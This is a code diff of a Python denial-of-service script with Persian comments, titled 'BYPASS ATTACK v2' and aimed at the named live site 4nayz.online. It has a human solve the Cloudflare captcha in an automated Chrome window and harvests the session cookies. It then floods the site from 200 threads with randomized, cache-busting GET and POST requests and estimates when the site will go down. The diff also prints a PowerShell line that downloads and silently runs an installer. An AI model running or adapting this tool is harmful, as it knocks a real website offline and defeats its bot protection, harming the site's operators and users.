@@ -10,34 +10,25 @@ import subprocess
 from datetime import datetime
 
 # ============================================
-# نصب پکیج‌ها (اگه نصب نیست)
+# نصب پکیج‌ها
 # ============================================
 
 def install_packages():
     packages = [
         "cloudscraper",
-        "selenium",
+        "selenium==4.15.0",  # نسخه پایدار
         "requests",
-        "fake-useragent"
+        "fake-useragent",
+        "webdriver-manager"
     ]
 
     for pkg in packages:
         try:
-            exec(f"import {pkg.replace('-', '_')}")
-        except ImportError:
+            pkg_name = pkg.split("==")[0].replace("-", "_")
+            exec(f"import {pkg_name}")
+        except:
             print(f"[*] نصب {pkg}...")
             os.system(f"pip install {pkg} -q")
-
-    # نصب chromedriver
-    try:
-        from selenium import webdriver
-    except:
-        os.system("pip install selenium -q")
-
-    # چک کردن ChromeDriver
-    if not os.path.exists("chromedriver.exe"):
-        print("[*] دانلود ChromeDriver...")
-        os.system("pip install webdriver-manager -q")
 
 install_packages()
 
@@ -45,23 +36,13 @@ install_packages()
 # ایمپورت‌ها
 # ============================================
 
-try:
-    import cloudscraper
-except:
-    os.system("pip install cloudscraper -q")
-    import cloudscraper
-
-try:
-    from selenium import webdriver
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
-except:
-    os.system("pip install selenium -q")
-    from selenium import webdriver
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
+import cloudscraper
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
 try:
     from webdriver_manager.chrome import ChromeDriverManager
@@ -70,15 +51,10 @@ except:
     HAS_MANAGER = False
 
 # ============================================
-# تنظیمات اصلی
+# تنظیمات
 # ============================================
 
-# دو تا سایت هدف
-TARGETS = [
-    "https://4nayz.online",
-    "https://4nayz.online"  # همون سایت رو دو بار میزنیم
-]
-
+TARGET = "https://4nayz.online"
 RUNNING = True
 success = 0
 fail = 0
@@ -96,7 +72,7 @@ def show_banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("""
 ╔══════════════════════════════════════════════════════════╗
-║     💀 4NAYZ.ONLINE - BYPASS ATTACK v2.0 💀           ║
+║     💀 4NAYZ.ONLINE - BYPASS ATTACK v2 💀             ║
 ╠══════════════════════════════════════════════════════════╣
 ║                                                          ║
 ║  🎯 کروم باز میشه → کپچا حل کن → حمله شروع             ║
@@ -107,20 +83,17 @@ def show_banner():
     """)
 
 # ============================================
-# تابع ۱: باز کردن مرورگر و حل کپچا
+# تابع ۱: باز کردن کروم
 # ============================================
 
-def open_browser_and_solve():
-    """کروم رو باز میکنه، کپچا رو حل کن"""
+def open_chrome_and_solve():
+    """کروم باز میکنه و منتظر میمونه تا کپچا حل بشه"""
     global session_cookies, bypass_count
 
     print("\n" + "="*50)
     print("🌐 مرحله ۱: باز کردن مرورگر کروم")
     print("="*50)
-    print("\n✅ کروم باز میشه...")
-    print("✅ کپچای Cloudflare رو حل کن")
-    print("✅ بعد از حل شدن، صفحه رو نبند")
-    print("✅ برگرد به ترمینال و Enter بزن\n")
+    print()
 
     driver = None
 
@@ -132,49 +105,72 @@ def open_browser_and_solve():
         chrome_options.add_experimental_option('useAutomationExtension', False)
         chrome_options.add_argument("--start-maximized")
         chrome_options.add_argument("--disable-popup-blocking")
-        chrome_options.add_argument("--disable-web-security")
-        chrome_options.add_argument("--allow-running-insecure-content")
+        chrome_options.add_argument("--no-sandbox")
+        chrome_options.add_argument("--disable-dev-shm-usage")
 
-        # User-Agent واقعی
+        # User-Agent
         chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 
         # باز کردن کروم
         if HAS_MANAGER:
+            print("[*] استفاده از webdriver-manager...")
             service = Service(ChromeDriverManager().install())
             driver = webdriver.Chrome(service=service, options=chrome_options)
         else:
+            print("[*] استفاده از Chrome پیشفرض...")
             driver = webdriver.Chrome(options=chrome_options)
 
         # رفتن به سایت
-        driver.get(TARGETS[0])
-        print(f"[+] صفحه {TARGETS[0]} باز شد")
-        print(f"[+] لطفاً کپچا رو حل کن...\n")
+        print(f"[*] رفتن به {TARGET}...")
+        driver.get(TARGET)
 
-        # منتظر موندن برای حل کپچا
-        input("⏳ بعد از حل کپچا، اینجا Enter بزن: ")
+        print(f"\n✅ کروم باز شد!")
+        print(f"✅ کپچای Cloudflare رو حل کن")
+        print(f"✅ بعد از حل شدن، برگرد به ترمینال")
+        print()
+
+        # صبر کن تا کاربر بگه حل کرده
+        input("⏳ کپچا رو حل کردی؟ Enter بزن: ")
 
         # گرفتن کوکی‌ها
+        print("[*] گرفتن کوکی‌ها...")
+        time.sleep(2)  # صبر کوتاه
+
         cookies = driver.get_cookies()
-        session_cookies = {c['name']: c['value'] for c in cookies}
+        print(f"[*] {len(cookies)} کوکی پیدا شد")
+
+        if not cookies:
+            print("[!] کوکی پیدا نشد! صفحه رو رفرش میکنم...")
+            driver.refresh()
+            time.sleep(3)
+            cookies = driver.get_cookies()
+            print(f"[*] {len(cookies)} کوکی بعد از رفرش")
 
         # ذخیره کوکی‌ها
+        session_cookies = {}
+        for c in cookies:
+            session_cookies[c['name']] = c['value']
+
         with open('cookies.json', 'w') as f:
             json.dump(session_cookies, f)
 
-        print(f"\n✅ {len(cookies)} کوکی گرفته شد و ذخیره شد")
-        bypass_count += 1
+        print(f"✅ {len(session_cookies)} کوکی ذخیره شد")
 
         # گرفتن User-Agent
-        ua = driver.execute_script("return navigator.userAgent")
-        with open('user_agent.txt', 'w') as f:
-            f.write(ua)
-
-        print(f"✅ User-Agent ذخیره شد")
+        try:
+            ua = driver.execute_script("return navigator.userAgent")
+            with open('user_agent.txt', 'w') as f:
+                f.write(ua)
+            print(f"✅ User-Agent ذخیره شد")
+        except:
+            pass
 
         # بستن کروم
         driver.quit()
+        bypass_count += 1
         captcha_solved.set()
 
+        print(f"\n✅ آماده حمله!")
         return True
 
     except Exception as e:
@@ -187,14 +183,10 @@ def open_browser_and_solve():
         return False
 
 # ============================================
-# تابع ۲: تولید URL منحصر به فرد
+# تابع ۲: تولید URL
 # ============================================
 
-def generate_random_string(length=16):
-    chars = string.ascii_letters + string.digits
-    return ''.join(random.choices(chars, k=length))
-
-def generate_url(target):
+def generate_url():
     paths = [
         "/", "/guess-x", "/guess-x/play", "/guess-x/bet",
         "/mines", "/mines/play", "/mines/reveal",
@@ -204,28 +196,25 @@ def generate_url(target):
         "/hangtight", "/leaderboard", "/challenges"
     ]
 
-    params = {
-        't': str(time.time_ns()),
-        'r': generate_random_string(32),
-        'h': hashlib.md5(generate_random_string(64).encode()).hexdigest(),
-        'v': str(random.randint(1, 9999)),
-        'n': str(random.randint(1, 999999999)),
-        '_': str(random.randint(1, 999999999)),
-        'cache': 'false'
-    }
+    params = (
+        ('t', str(time.time_ns())),
+        ('r', hashlib.md5(str(random.random()).encode()).hexdigest()),
+        ('v', str(random.randint(1, 9999))),
+        ('_', str(random.randint(1, 999999999))),
+        ('cache', 'false')
+    )
 
-    query = '&'.join([f"{k}={v}" for k, v in params.items()])
+    query = '&'.join([f"{k}={v}" for k, v in params])
     path = random.choice(paths)
 
-    return f"{target}{path}?{query}"
+    return f"{TARGET}{path}?{query}"
 
 # ============================================
-# تابع ۳: حمله با سشن معتبر
+# تابع ۳: حمله
 # ============================================
 
 def attack_worker():
-    """هر ترد این تابع رو اجرا میکنه"""
-    global success, fail, bypass_count, session_cookies, RUNNING
+    global success, fail, session_cookies, RUNNING
 
     try:
         # خوندن User-Agent
@@ -233,15 +222,14 @@ def attack_worker():
             with open('user_agent.txt', 'r') as f:
                 user_agent = f.read().strip()
         except:
-            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
         # ساختن اسکراپر
         scraper = cloudscraper.create_scraper(
             browser={
                 'browser': 'chrome',
                 'platform': 'windows',
-                'desktop': True,
-                'mobile': False
+                'desktop': True
             },
             delay=0.01
         )
@@ -250,42 +238,30 @@ def attack_worker():
         for name, value in session_cookies.items():
             scraper.cookies.set(name, value)
 
-        # هدرها
-        headers = {
-            'User-Agent': user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Pragma': 'no-cache',
-            'DNT': '1',
-            'Referer': TARGETS[0]
-        }
-
         while RUNNING:
             try:
-                # انتخاب یک سایت تصادفی
-                target = random.choice(TARGETS)
-                url = generate_url(target)
+                url = generate_url()
 
-                # درخواست
+                headers = {
+                    'User-Agent': user_agent,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Cache-Control': 'no-cache, no-store, must-revalidate',
+                    'Pragma': 'no-cache',
+                    'Referer': TARGET
+                }
+
+                # 30% POST, 70% GET
                 if random.random() < 0.3:
                     r = scraper.post(url, headers=headers, timeout=5)
                 else:
                     r = scraper.get(url, headers=headers, timeout=5)
 
-                # اگه کپچا خورد
                 if r.status_code in [503, 403]:
                     with lock:
                         fail += 1
-                    # کپچا رو ریست کن
-                    captcha_solved.clear()
-                    return
+                        captcha_solved.clear()
+                    break
                 else:
                     with lock:
                         success += 1
@@ -318,19 +294,15 @@ def show_stats():
 ╠══════════════════════════════════════════════════════════╣
         """)
 
-        print(f"  ⏱ زمان: {elapsed} ثانیه")
-        print(f"  ✅ موفق: {success:,}")
-        print(f"  ❌ خطا: {fail:,}")
-        print(f"  🚀 نرخ: {rate:,}/s")
-        print(f"  📊 مجموع: {total:,}")
-        print(f"  🔄 دور زدن کپچا: {bypass_count}")
+        print(f"  ⏱ زمان: {elapsed} ثانیه           🔄 دور زدن: {bypass_count}")
+        print(f"  ✅ موفق: {success:,}             ❌ خطا: {fail:,}")
+        print(f"  🚀 نرخ: {rate:,}/s              📊 مجموع: {total:,}")
 
-        # پیشبینی زمان down شدن
         if rate > 0:
             remaining = 50000 - total
             if remaining > 0:
                 est_time = remaining // rate
-                print(f"  ⏳ تخمین down شدن: {est_time} ثانیه دیگه")
+                print(f"  ⏳ تخمین down: {est_time} ثانیه دیگه")
             else:
                 print(f"  💀 سایت down شد!")
 
@@ -338,42 +310,29 @@ def show_stats():
 ╚══════════════════════════════════════════════════════════╝
         """)
 
-        print("  [Ctrl+C برای توقف]")
-
-# ============================================
-# تابع ۵: چک کردن کپچا
-# ============================================
-
-def check_captcha_periodically():
-    """هر ۳ دقیقه چک میکنه اگه کپچا فعال شده"""
-    global bypass_count, session_cookies
-
-    while RUNNING:
-        time.sleep(180)  # 3 دقیقه
-
         if not captcha_solved.is_set():
-            print("\n⚠️ کپچا فعال شده!")
-            print("🌐 باز کردن کروم برای حل مجدد...")
-
-            if open_browser_and_solve():
-                print("✅ کپچا دوباره حل شد! ادامه حمله...")
+            print("  ⚠️ کپچا فعال شد! کروم باز میشه...")
+        else:
+            print("  [Ctrl+C برای توقف]")
 
 # ============================================
 # تابع اصلی
 # ============================================
 
 def main():
-    global RUNNING, start_time, session_cookies
+    global RUNNING, start_time
 
     show_banner()
 
-    # مرحله ۱: حل کپچا
+    # حل کپچا
     print("📌 مرحله ۱: حل کپچا")
     print("-"*40)
 
-    if not open_browser_and_solve():
-        print("\n❌ خطا در باز کردن مرورگر!")
+    if not open_chrome_and_solve():
+        print("\n❌ خطا در باز کردن کروم!")
         print("مطمئن شو Chrome نصب باشه")
+        print("یا با دستور نصبش کن:")
+        print("  @powershell -Command \"& {Invoke-WebRequest -Uri 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '%TEMP%\\chrome.exe'; Start-Process -Wait -FilePath '%TEMP%\\chrome.exe' -ArgumentList '/silent /install'}\"")
         input("\nEnter بزن برای خروج...")
         sys.exit(1)
 
@@ -383,43 +342,37 @@ def main():
 
     start_time = time.time()
 
-    # شروع نمایش آمار
+    # نمایش آمار
     stats_thread = threading.Thread(target=show_stats)
     stats_thread.daemon = True
     stats_thread.start()
 
-    # شروع چک کپچا
-    check_thread = threading.Thread(target=check_captcha_periodically)
-    check_thread.daemon = True
-    check_thread.start()
-
     # شروع کارگرها
-    workers = []
     for i in range(200):
         w = threading.Thread(target=attack_worker)
         w.daemon = True
         w.start()
-        workers.append(w)
 
-    # منتظر موندن برای توقف
+    # حلقه اصلی
     try:
         while True:
             time.sleep(1)
 
-            # اگه کپچا فعال شد، صبر کن تا حل بشه
+            # اگه کپچا فعال شد
             if not captcha_solved.is_set():
-                print("\n⚠️ کپچا فعال شد! منتظر حل مجدد...")
-                # دوباره کروم باز کن
-                if open_browser_and_solve():
-                    print("✅ ادامه حمله...")
-                    # کارگرهای جدید شروع کن
+                print("\n⚠️ کپچا فعال شد!")
+                time.sleep(2)
+
+                if open_chrome_and_solve():
+                    print("✅ کپچا دوباره حل شد!")
+                    # کارگرهای جدید
                     for i in range(200):
                         w = threading.Thread(target=attack_worker)
                         w.daemon = True
                         w.start()
 
     except KeyboardInterrupt:
-        print("\n\n🛑 توقف حمله...")
+        print("\n\n🛑 توقف...")
         RUNNING = False
 
         elapsed = int(time.time() - start_time)
@@ -432,7 +385,7 @@ def main():
 ║  ⏱ زمان: {elapsed} ثانیه                              ║
 ║  ✅ موفق: {success:,}                                  ║
 ║  ❌ خطا: {fail:,}                                      ║
-║  🔄 دور زدن کپچا: {bypass_count}                       ║
+║  🔄 دور زدن: {bypass_count}                            ║
 ║  📊 مجموع: {total:,}                                   ║
 ╚══════════════════════════════════════════════════════════╝
         """)
@@ -448,5 +401,7 @@ if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        print(f"\n❌ خطای اصلی: {e}")
+        print(f"\n❌ خطا: {e}")
+        import traceback
+        traceback.print_exc()
         input("\nEnter بزن برای خروج...")
